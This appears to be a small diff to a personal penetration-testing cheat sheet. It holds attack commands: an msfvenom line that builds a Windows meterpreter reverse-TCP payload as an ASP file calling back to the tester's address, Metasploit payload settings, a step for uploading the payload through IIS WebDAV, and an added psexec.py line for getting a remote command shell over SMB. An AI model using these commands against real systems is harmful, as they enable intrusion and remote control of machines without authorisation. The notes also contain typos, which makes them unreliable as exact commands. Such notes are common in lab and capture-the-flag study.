@@ -9,6 +9,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST= my_ip LPORT=1234 -f asp > pay
 set payload windows/metrepreter/reverse_tcp 
 iis upload // make sure to set Path /webdavdir/payload
 
+SMB -
+psexec.py user@ip cmd.exe // psawns cmd shell
+
 
 MSF -
 analyze  // anaylzes hosts and ervices in db and provide vulns
